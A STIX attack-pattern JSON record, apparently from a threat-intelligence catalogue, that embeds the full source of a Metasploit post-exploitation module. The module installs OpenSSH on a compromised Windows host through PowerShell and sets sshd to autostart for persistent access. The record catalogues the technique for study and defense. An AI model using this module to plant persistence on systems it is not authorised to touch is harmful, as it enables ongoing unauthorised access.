{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb5d0906-f520-4b72-bb8e-908c7875453b",
    "created": "2024-08-14T16:33:04.999011Z",
    "modified": "2024-08-14T16:33:04.999014Z",
    "name": "Install OpenSSH for Windows",
    "description": " This module installs OpenSSH server and client for Windows using PowerShell. SSH on Windows can provide pentesters persistent access to a secure interactive terminal, interactive filesystem access, and port forwarding over SSH.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/install_ssh.rb",
            "external_id": "install_ssh.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/PowerShell/openssh-portable"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Install OpenSSH for Windows',\n        'Description' => %q{\n          This module installs OpenSSH server and client for Windows using PowerShell.\n          SSH on Windows can provide pentesters persistent access to a secure interactive terminal, interactive filesystem access, and port forwarding over SSH.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Michael Long <bluesentinel[at]protonmail.com>'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'References'\t=> [\n          ['URL', 'https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview'],\n          ['URL', 'https://github.com/PowerShell/openssh-portable']\n        ]\n      )\n    )\n    register_options(\n      [\n        OptBool.new('INSTALL_SERVER', [true, 'Install OpenSSH.Server for Windows', true]),\n        OptBool.new('INSTALL_CLIENT', [true, 'Install OpenSSH.Client for Windows', true]),\n        OptBool.new('UNINSTALL_SERVER', [true, 'Uninstall OpenSSH.Server for Windows', false]),\n        OptBool.new('UNINSTALL_CLIENT', [true, 'Uninstall OpenSSH.Client for Windows', false]),\n        OptString.new('SERVER_VER', [true, 'OpenSSH.Server version', 'OpenSSH.Server~~~~0.0.1.0']),\n        OptString.new('CLIENT_VER', [true, 'OpenSSH.Client version', 'OpenSSH.Client~~~~0.0.1.0']),\n        OptBool.new('AUTOSTART', [true, 'Sets sshd service to startup automatically at system boot for persistence', true])\n      ]\n    )\n  end\n\n  def run\n    # check admin privileges\n    unless is_system? || is_admin?\n      fail_with(Failure::NotVulnerable, 'Insufficient privileges to install or remove OpenSSH')\n    end\n\n    # check if PowerShell is available\n    psh_path = '\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n    if !file? \"%WINDIR%\\\\System32#{psh_path}\"\n      fail_with(Failure::NotVulnerable, 'No powershell available.')\n    end\n\n    # uninstall OpenSSH.Server\n    if datastore['UNINSTALL_SERVER']\n      print_status('Uninstalling OpenSSH.Server')\n      uninstall_ssh_server\n    end\n\n    # unintall OpenSSH.Client\n    if datastore['UNINSTALL_CLIENT']\n      print_status('Uninstalling OpenSSH.Client')\n      uninstall_ssh_client\n    end\n\n    # install OpenSSH.Server\n    if datastore['INSTALL_SERVER']\n      print_status('Installing OpenSSH.Server')\n      install_ssh_server\n    end\n\n    # install OpenSSH.Client\n    if datastore['INSTALL_CLIENT']\n      print_status('Installing OpenSSH.Client')\n      install_ssh_client\n    end\n  end\n\n  def install_ssh_server\n    script = \"Add-WindowsCapability -Online -Name #{datastore['SERVER_VER']}; \"\n    script << 'Start-Service sshd; '\n    if datastore['AUTOSTART']\n      script << \"Set-Service -Name sshd -StartupType 'Automatic'\"\n    end\n    psh_exec(script)\n  end\n\n  def install_ssh_client\n    script = \"Add-WindowsCapability -Online -Name #{datastore['CLIENT_VER']}; \"\n    psh_exec(script)\n  end\n\n  def uninstall_ssh_server\n    script = 'Stop-Service sshd; '\n    script << \"Remove-WindowsCapability -Online -Name #{datastore['SERVER_VER']}\"\n    psh_exec(script)\n  end\n\n  def uninstall_ssh_client\n    script = \"Remove-WindowsCapability -Online -Name #{datastore['CLIENT_VER']}\"\n    psh_exec(script)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}